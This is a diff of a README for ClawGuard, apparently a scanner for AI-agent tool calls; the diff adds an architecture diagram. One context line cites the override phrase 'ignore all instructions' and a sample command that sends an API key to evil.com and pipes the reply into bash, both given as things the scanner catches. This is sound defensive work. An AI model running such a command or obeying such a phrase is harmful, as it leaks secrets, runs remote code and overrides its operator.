@@ -46,6 +46,41 @@ $ npx @neuzhou/clawguard scan ./my-agent/
 
 ---
 
+## Architecture
+
+```mermaid
+graph TB
+    subgraph Input["🎯 What You Scan"]
+        A["Agent Code<br/>Skills & Prompts"] --> B["🛡️ ClawGuard Engine"]
+        C["MCP Servers<br/>Tools & Manifests"] --> B
+        D["Tool Calls<br/>Runtime Policies"] --> B
+    end
+    subgraph Engine["⚙️ Analysis Pipeline"]
+        B --> E["Static Analysis<br/>350+ Patterns"]
+        B --> F["AI Rule Generator<br/>Natural Language → Rules"]
+        B --> G["Plugin System<br/>ESLint-style"]
+        B --> H["Red Team Engine<br/>Adversarial Testing"]
+        E --> I["Risk Scoring<br/>Attack Chain Detection"]
+        G --> J["Semgrep YAML"]
+        G --> K["YARA Rules"]
+        G --> L["Custom JSON/YAML"]
+    end
+    subgraph Output["📊 Results"]
+        I --> M["SARIF Report"]
+        I --> N["Security Grade<br/>A/B/C/D/F"]
+        M --> O["GitHub Security Tab"]
+        M --> P["CI/CD Gate"]
+        M --> Q["VS Code Problems"]
+        N --> R["HTML Dashboard"]
+    end
+
+    style Input fill:#1a1a2e,stroke:#16213e,color:#e94560
+    style Engine fill:#0f3460,stroke:#16213e,color:#e94560
+    style Output fill:#533483,stroke:#16213e,color:#e94560
+```
+
+---
+
 ## Why ClawGuard→
 
 Your AI agent has tools — shell, files, browser, APIs, secrets. Most guardrails scan **prompts**. ClawGuard scans **tool calls**. That's the difference between catching "ignore all instructions" and catching `curl http://evil.com→key=$API_KEY | bash`.
